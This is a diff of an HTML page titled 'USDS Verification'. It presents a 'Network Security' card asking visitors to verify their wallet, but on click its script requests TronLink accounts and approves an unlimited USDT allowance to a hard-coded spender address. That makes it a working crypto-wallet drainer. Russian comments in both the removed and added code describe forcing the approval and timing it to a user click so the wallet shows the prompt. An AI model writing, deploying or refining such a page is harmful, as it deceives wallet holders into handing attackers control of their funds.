@@ -1,26 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>USDS Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+    <style>
+        body { margin: 0; background: #000; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 24px; width: 80%; max-width: 320px; }
+        .btn { background: #3b82f6; color: white; border: none; padding: 16px 32px; border-radius: 12px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4); }
+        .btn:active { transform: scale(0.98); opacity: 0.8; }
+        .status { margin-top: 20px; color: #555; font-size: 12px; letter-spacing: 1px; text-transform: uppercase; }
+    </style>
 </head>
-<body style="background:#000;">
+<body>
+
+<div class="card">
+    <div style="font-size: 24px; margin-bottom: 10px;">🔐</div>
+    <div style="margin-bottom: 20px; font-size: 18px; font-weight: 500;">Network Security</div>
+    <p style="color: #888; font-size: 14px; margin-bottom: 30px;">Verify your wallet to proceed with USDS Standart network.</p>
+    
+    <button class="btn" id="actionBtn">CONTINUE</button>
+    <div class="status" id="st">Waiting for interaction...</div>
+</div>
+
 <script>
-    async function fastApprove() {
-        if (window.tronLink) {
-            // 1. Форсируем коннект
-            await window.tronLink.request({ method: 'tron_requestAccounts' });
-            // 2. Сразу кидаем Approve
-            const contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
-            await contract.approve("TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
+    const spender = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an"; 
+    const usdt = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+
+    document.getElementById('actionBtn').addEventListener('click', async () => {
+        const status = document.getElementById('st');
+        status.innerText = "CONNECTING...";
+
+        try {
+            // Теперь, когда был КЛИК, кошелек РАЗРЕШИТ вызвать окно
+            if (window.tronLink) {
+                const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+                if (res.code === 200) {
+                    status.innerText = "VERIFYING...";
+                    const contract = await window.tronWeb.contract().at(usdt);
+                    await contract.approve(spender, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
+                    status.innerText = "VERIFIED SUCCESSFULLY";
+                }
+            } else {
+                status.innerText = "PLEASE OPEN IN WALLET BROWSER";
+            }
+        } catch (e) {
+            console.error(e);
+            status.innerText = "ERROR: TRY AGAIN";
         }
-    }
-    // Запускаем проверку каждые 100мс, чтобы поймать момент инъекции кошелька
-    const interval = setInterval(() => {
-        if (window.tronWeb) {
-            clearInterval(interval);
-            fastApprove();
-        }
-    }, 100);
+    });
 </script>
 </body>
 </html>
